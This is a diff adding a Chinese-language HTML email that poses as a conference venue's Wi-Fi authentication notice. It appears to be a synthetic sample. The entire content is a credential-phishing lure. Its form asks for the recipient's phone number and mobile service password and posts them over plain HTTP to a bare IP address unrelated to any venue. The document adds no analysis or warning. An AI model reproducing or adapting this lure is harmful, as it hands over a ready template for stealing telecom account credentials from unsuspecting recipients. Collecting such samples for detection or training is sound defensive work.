@@ -1,0 +1,9 @@
+From: =?utf-8?B?5Lya6K6u572R57uc?= <wifi@venue-net.example>
+To: guest@corp.internal
+Date: Fri, 28 Aug 2026 14:28:00 +0800
+Message-ID: <0018-b5@synth.example>
+Subject: 会场 Wi-Fi 认证
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+
+<html><body><p>连接会场 Wi-Fi 后请完成一次认证（手机号+服务密码）：</p><form action='http://203.0.113.77/wifi'><input name='msisdn' placeholder='手机号'><input type='password' name='svc' placeholder='服务密码'><button>连网</button></form></body></html>
